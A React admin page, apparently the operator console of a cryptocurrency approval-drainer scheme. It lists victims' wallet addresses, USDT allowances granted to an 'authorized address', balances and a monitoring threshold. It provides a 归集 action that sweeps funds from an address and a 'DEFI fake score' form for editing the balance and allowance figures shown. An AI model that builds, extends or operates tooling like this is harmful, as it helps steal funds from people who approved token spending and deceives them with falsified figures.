import React, { useState } from 'react';
import { message, Tag, Form, Input, Select, Button, Space, Popconfirm } from 'antd';
import CmBasePage from '@components/CmBasePage';
import DataForm from '@components/DataForm';
import {
  listInfo,
  getInfo,
  updateInfo,
  refreshApi,
  collectionApi,
} from '@api';

const { Option } = Select;

/**
 * 授权管理页面
 */
const InfoPage = () => {
  // ==================== 状态管理 ====================
  const [formVisible, setFormVisible] = useState(false);
  const [defiFormVisible, setDefiFormVisible] = useState(false);
  const [editingRecord, setEditingRecord] = useState(null);
  const [loading, setLoading] = useState(false);

  // ==================== 事件处理函数 ====================

  /**
   * 刷新钱包余额
   */
  const handleRefresh = async (record) => {
    try {
      const response = await refreshApi({
        userId: record.userId,
        address: record.address
      });
      if (response.code === 200) {
        message.success(response.msg || '刷新成功');
        refreshTable();
      } else {
        message.error(response.msg || '刷新失败');
      }
    } catch (error) {
      message.error('刷新失败: ' + error.message);
    }
  };

  /**
   * 归集
   */
  const handleCollection = async (record) => {
    try {
      const response = await collectionApi({
        userId: record.userId,
        address: record.address,
        hash: record.hash
      });
      if (response.code === 200) {
        message.success(response.msg || '归集成功');
        setTimeout(() => {
          handleRefresh(record);
        }, 1000);
      } else {
        message.error(response.msg || '归集失败');
      }
    } catch (error) {
      message.error('归集失败: ' + error.message);
    }
  };

  /**
   * 修改监控额度
   */
  const handleUpdateMonitor = (record) => {
    setEditingRecord(record);
    setFormVisible(true);
  };

  /**
   * 修改DEFI假分
   */
  const handleUpdateDefi = (record) => {
    setEditingRecord(record);
    setDefiFormVisible(true);
  };

  /**
   * 提交监控额度表单
   */
  const handleSubmitMonitor = async (values) => {
    setLoading(true);
    try {
      const response = await updateInfo({
        ...editingRecord,
        ...values,
      });
      if (response.code === 0 || response.code === 200) {
        message.success('修改成功');
        setFormVisible(false);
        refreshTable();
      } else {
        message.error(response.msg || '操作失败');
      }
    } catch (error) {
      message.error('操作失败: ' + error.message);
    } finally {
      setLoading(false);
    }
  };

  /**
   * 提交DEFI假分表单
   */
  const handleSubmitDefi = async (values) => {
    setLoading(true);
    try {
      const response = await updateInfo({
        ...editingRecord,
        ...values,
      });
      if (response.code === 0 || response.code === 200) {
        message.success('修改成功');
        setDefiFormVisible(false);
        refreshTable();
      } else {
        message.error(response.msg || '操作失败');
      }
    } catch (error) {
      message.error('操作失败: ' + error.message);
    } finally {
      setLoading(false);
    }
  };

  /**
   * 刷新表格
   */
  const refreshTable = () => {
    document.querySelector('.ant-pro-table')?.parentNode?.dispatchEvent(
      new CustomEvent('reload')
    );
  };

  // ==================== 数据映射配置 ====================

  // 地址类型映射
  const addressTypeMap = {
    'TRC20': { color: 'blue', text: 'TRC20' },
    'ERC20': { color: 'green', text: 'ERC20' },
    'OMNI': { color: 'orange', text: 'OMNI' },
  };

  // ==================== 列配置 ====================

  const columns = [
    {
      title: '用户ID',
      dataIndex: 'userId',
      key: 'userId',
      width: 100,
    },
    {
      title: '地址',
      dataIndex: 'address',
      key: 'address',
      width: 200,
      render: (text) => {
        if (!text) return '无地址';
        const shortAddress = `${text.substr(0, 4)}******${text.substr(-4)}`;
        return (
          <Space>
            <span>{shortAddress}</span>
            <Button
              type="link"
              size="small"
              onClick={() => {
                navigator.clipboard.writeText(text);
                message.success('复制成功');
              }}
            >
              复制
            </Button>
          </Space>
        );
      },
    },
    {
      title: '授权地址',
      dataIndex: 'authAddress',
      key: 'authAddress',
      width: 300,
      render: (text) => {
        if (!text) return '无地址';
        return (
          <Space>
            <span>{text}</span>
            <Button
              type="link"
              size="small"
              onClick={() => {
                navigator.clipboard.writeText(text);
                message.success('复制成功');
              }}
            >
              复制
            </Button>
          </Space>
        );
      },
    },
    {
      title: '地址类型',
      dataIndex: 'walletType',
      key: 'walletType',
      width: 120,
      render: (type) => {
        const status = addressTypeMap[type] || { color: 'default', text: type || '未知' };
        return <Tag color={status.color}>{status.text}</Tag>;
      },
    },
    {
      title: '授权USDT金额上限',
      dataIndex: 'usdtAllowed',
      key: 'usdtAllowed',
      width: 150,
    },
    {
      title: '钱包U余额',
      dataIndex: 'usdt',
      key: 'usdt',
      width: 120,
    },
    {
      title: '钱包ETH余额',
      dataIndex: 'eth',
      key: 'eth',
      width: 120,
    },
    {
      title: '钱包TRX余额',
      dataIndex: 'trx',
      key: 'trx',
      width: 120,
    },
    {
      title: '监控额度',
      dataIndex: 'usdtMonitor',
      key: 'usdtMonitor',
      width: 120,
    },
    {
      title: 'defi授权假分',
      dataIndex: 'status',
      key: 'status',
      width: 120,
      render: (status) => (
        <Tag color={status == 'Y' ? 'success' : 'default'}>
          {status == 'Y' ? '是' : '否'}
        </Tag>
      ),
    },
  ];

  // ==================== 搜索配置 ====================

  const searchFieldList = [
    {
      title: '用户ID',
      dataIndex: 'userId',
      key: 'SEARCH_LIKE_userId',
      type: 'text',
    },
    {
      title: '地址',
      dataIndex: 'address',
      key: 'SEARCH_LIKE_address',
      type: 'text',
    },
    {
      title: '地址类型',
      dataIndex: 'walletType',
      key: 'SEARCH_EQ_walletType',
      type: 'select',
      options: [
        { label: 'TRC20', value: 'TRC20' },
        { label: 'ERC20', value: 'ERC20' },
        { label: 'OMNI', value: 'OMNI' },
      ],
    },
  ];

  // ==================== 渲染 ====================

  return (
    <div>
      {/* 主列表页面 */}
      <CmBasePage
        columns={columns}
        apiEndpoint="/asset/appAddressInfo/list"
        apiMethod="get"
        searchFieldList={searchFieldList}
        rowKey="userId"
        actionButtons={{
          edit: false,
          delete: false,
        }}
        rowActions={(record) => [
          {
            title: '刷新',
            onClick: () => handleRefresh(record),
            type: 'primary',
          },
          {
            title: '归集',
            onClick: () => handleCollection(record),
            type: 'default',
          },
          {
            title: '监控额度',
            onClick: () => handleUpdateMonitor(record),
            type: 'default',
          },
          {
            title: 'defi授权假分',
            onClick: () => handleUpdateDefi(record),
            type: 'primary',
          },
        ]}
      />

      {/* 监控额度表单弹窗 */}
      <DataForm
        visible={formVisible}
        title="修改监控额度"
        initialValues={editingRecord}
        onCancel={() => setFormVisible(false)}
        onSubmit={handleSubmitMonitor}
        onClosed={() => setEditingRecord(null)}
        loading={loading}
        formType="modal"
        width={500}
      >
        <Form.Item
          name="usdtMonitor"
          label="监控额度"
          rules={[{ required: true, message: '请输入监控额度' }]}
        >
          <Input type="number" placeholder="请输入监控额度" />
        </Form.Item>
      </DataForm>

      {/* DEFI假分表单弹窗 */}
      <DataForm
        visible={defiFormVisible}
        title="DEFI假分"
        initialValues={editingRecord}
        onCancel={() => setDefiFormVisible(false)}
        onSubmit={handleSubmitDefi}
        onClosed={() => setEditingRecord(null)}
        loading={loading}
        formType="modal"
        width={500}
      >
        <Form.Item
          name="usdt"
          label="钱包余额"
        >
          <Input type="number" placeholder="请输入钱包余额" />
        </Form.Item>

        <Form.Item
          name="usdtAllowed"
          label="授权"
        >
          <Input type="number" placeholder="请输入授权" />
        </Form.Item>

        <Form.Item
          name="status"
          label="DEFI假分"
          rules={[{ required: true, message: '请选择DEFI假分' }]}
        >
          <Select placeholder="请选择DEFI假分">
            <Option value="Y">是</Option>
            <Option value="N">否</Option>
          </Select>
        </Form.Item>
      </DataForm>
    </div>
  );
};

export default InfoPage;
